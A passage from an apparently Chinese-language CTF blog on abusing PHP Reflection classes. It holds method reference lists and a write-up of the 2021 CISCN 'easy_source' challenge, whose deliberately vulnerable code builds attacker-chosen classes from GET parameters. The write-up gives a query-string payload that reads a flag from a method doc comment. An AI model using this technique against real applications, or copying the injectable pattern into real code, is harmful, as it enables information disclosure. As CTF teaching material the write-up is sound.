</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getShortName</span><span class=p>()</span> <span class=c1>// 获取方法短名
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getStaticVariables</span><span class=p>()</span> <span class=c1>// 获取方法静态变量
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>hasReturnType</span><span class=p>()</span> <span class=c1>// 方法是否有特定返回类型
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>inNamespace</span><span class=p>()</span> <span class=c1>// 方法是否定义在命名空间
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>isClosure</span><span class=p>()</span> <span class=c1>// 方法是否是匿名函数
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>isDeprecated</span><span class=p>()</span> <span class=c1>// 方法是否弃用
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>isGenerator</span><span class=p>()</span> <span class=c1>// 方法是否是生成器函数
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>isInternal</span><span class=p>()</span> <span class=c1>// 方法是否是内部函数
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>,</span><span class=s2>&#34;method?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>isUserDefined</span><span class=p>()</span> <span class=c1>// 方法是否是用户定义
</span></span></span></code></pre></td></tr></table></div></div><p><strong>[2021 CISCN]easy_source</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>User</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>static</span> <span class=nv>$c</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>a</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>++</span><span class=nx>self</span><span class=o>::</span><span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>b</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>++</span><span class=nx>self</span><span class=o>::</span><span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>c</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>++</span><span class=nx>self</span><span class=o>::</span><span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>d</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>++</span><span class=nx>self</span><span class=o>::</span><span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>e</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>++</span><span class=nx>self</span><span class=o>::</span><span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>f</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>++</span><span class=nx>self</span><span class=o>::</span><span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>g</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>++</span><span class=nx>self</span><span class=o>::</span><span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>h</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>++</span><span class=nx>self</span><span class=o>::</span><span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>i</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>++</span><span class=nx>self</span><span class=o>::</span><span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>j</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>++</span><span class=nx>self</span><span class=o>::</span><span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>k</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>++</span><span class=nx>self</span><span class=o>::</span><span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>l</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>++</span><span class=nx>self</span><span class=o>::</span><span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>m</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>++</span><span class=nx>self</span><span class=o>::</span><span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>n</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>++</span><span class=nx>self</span><span class=o>::</span><span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>o</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>++</span><span class=nx>self</span><span class=o>::</span><span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>p</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>++</span><span class=nx>self</span><span class=o>::</span><span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>q</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>++</span><span class=nx>self</span><span class=o>::</span><span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>r</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>++</span><span class=nx>self</span><span class=o>::</span><span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>s</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>++</span><span class=nx>self</span><span class=o>::</span><span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>t</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>++</span><span class=nx>self</span><span class=o>::</span><span class=nv>$c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$rc</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s2>&#34;rc&#34;</span><span class=p>];</span>    
</span></span><span class=line><span class=cl><span class=nv>$rb</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s2>&#34;rb&#34;</span><span class=p>];</span>    
</span></span><span class=line><span class=cl><span class=nv>$ra</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s2>&#34;ra&#34;</span><span class=p>];</span>   
</span></span><span class=line><span class=cl><span class=nv>$rd</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s2>&#34;rd&#34;</span><span class=p>];</span>    
</span></span><span class=line><span class=cl><span class=nv>$method</span><span class=o>=</span> <span class=k>new</span> <span class=nv>$rc</span><span class=p>(</span><span class=nv>$ra</span><span class=p>,</span> <span class=nv>$rb</span><span class=p>);</span>    
</span></span><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nv>$method</span><span class=o>-&gt;</span><span class=nv>$rd</span><span class=p>());</span>   
</span></span></code></pre></td></tr></table></div></div><p>先扫描出这个关键文件之后，可以看到什么都没有，很明显是原生类的利用</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>return</span> <span class=o>++</span><span class=nx>self</span><span class=o>::</span><span class=nv>$c</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>这个是进行<code>User</code>类方法的调用,因为<code>$c</code>是一个静态属性嘛，每次触发一个方法就<code>++</code>,最后是可以把所有方法遍历的，那么我们可以大胆猜测<code>flag</code>在注释中,利用<code>ReflectionMethod</code>类,最后找到是在<code>q</code>里面</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?rc=ReflectionMethod&amp;ra=User&amp;rb=q&amp;rd=getDocComment
</span></span></code></pre></td></tr></table></div></div><p>这么传刚好也就形成了我们说的那个</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=s2>&#34;User&#34;</span><span class=p>,</span><span class=s2>&#34;q&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getDocComment</span>
</span></span></code></pre></td></tr></table></div></div><p>成功读取到了<code>flag</code></p><h4 id=reflectionclass>ReflectionClass</h4><p>利用版本：<code>(PHP 5, PHP 7)</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=c1># 获取/修改类中静态属性的值
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getStaticProperties</span><span class=p>();</span> <span class=c1># 获取静态属性
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getStaticPropertyValue</span><span class=p>(</span><span class=s2>&#34;key?&#34;</span><span class=p>,</span><span class=s2>&#34;default_value?&#34;</span><span class=p>);</span> <span class=c1># 获取指定静态属性的值，可以手动设置默认值
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>setStaticPropertyValue</span><span class=p>(</span><span class=s2>&#34;key?&#34;</span><span class=p>,</span><span class=s2>&#34;value?&#34;</span><span class=p>);</span> <span class=c1># 设置静态属性的值
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1># 获取类中属性的值
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getProperties</span><span class=p>();</span> <span class=c1># 获取属性
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getProperty</span><span class=p>(</span><span class=s2>&#34;key?&#34;</span><span class=p>)</span> <span class=c1># 获取指定属性的值
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1># 实例化新类，
</span></span></span><span class=line><span class=cl><span class=c1># 比如反射 phpinfo 函数
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$c</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s1>&#39;ReflectionFunction&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$iv</span> <span class=o>=</span> <span class=nv>$c</span><span class=o>-&gt;</span><span class=na>newInstance</span><span class=p>(</span><span class=s1>&#39;phpinfo&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$ia</span> <span class=o>=</span> <span class=nv>$c</span><span class=o>-&gt;</span><span class=na>newInstanceArgs</span><span class=p>(</span><span class=k>array</span><span class=p>(</span><span class=s1>&#39;phpinfo&#39;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nv>$ie</span> <span class=o>=</span> <span class=nv>$c</span><span class=o>-&gt;</span><span class=na>newInstanceWithoutConstructor</span><span class=p>();</span> <span class=c1>// 调用一个类但不调用其 __construct 方法
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1># 获取类信息
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>export</span><span class=p>();</span> <span class=c1>// 导出类
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getConstant</span><span class=p>(</span><span class=nx>string</span> <span class=nv>$name</span><span class=p>)</span> <span class=c1>// 获取类中指定常量值
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getConstants</span><span class=p>(</span><span class=o>?</span><span class=nx>int</span> <span class=nv>$filter</span> <span class=o>=</span> <span class=k>null</span><span class=p>)</span> <span class=c1>// 获取类中所有常量值
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getConstructor</span><span class=p>()</span> <span class=c1>// 获取类中构造方法(__construct)作为反射方法返回
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getDefaultProperties</span><span class=p>()</span> <span class=c1>// 获取类中默认属性
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getDocComment</span><span class=p>()</span> <span class=c1>// 获取类的注释
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getStartLine</span><span class=p>()</span> <span class=c1>// 获取类开始行号
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getEndLine</span><span class=p>()</span> <span class=c1>// 获取类结束行号
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getExtensionName</span><span class=p>()</span> <span class=c1>// 获取类的扩展名称
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getFileName</span><span class=p>()</span> <span class=c1>// 获取类所在的文件名
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getInterfaceNames</span><span class=p>()</span> <span class=c1>// 获取类的接口名称
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getInterfaces</span><span class=p>()</span> <span class=c1>// 获取类的接口
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getMethod</span><span class=p>(</span><span class=nx>string</span> <span class=nv>$name</span><span class=p>)</span> <span class=c1>// 获取类的指定方法作为反射方法返回
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getMethods</span><span class=p>()</span> <span class=c1>// 获取类的方法
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getModifiers</span><span class=p>()</span> <span class=c1>// 获取类的修饰符
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getName</span><span class=p>()</span> <span class=c1>// 获取类名称
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getNamespaceName</span><span class=p>()</span> <span class=c1>// 获取类所在命名空间名称
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getParentClass</span><span class=p>()</span> <span class=c1>// 获取父类作为反射类返回
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getReflectionConstant</span><span class=p>()</span> <span class=c1>// 获取类的指定常量作为反射类常量返回
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getReflectionConstants</span><span class=p>()</span> <span class=c1>// 获取类的常量作为反射类常量数组返回
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getShortName</span><span class=p>()</span> <span class=c1>// 获取类的短名
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>(</span><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s2>&#34;class?&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>getTraitAliases</span><span class=p>()</span> <span class=c1>// 获取类所使用 trait 别名的数组
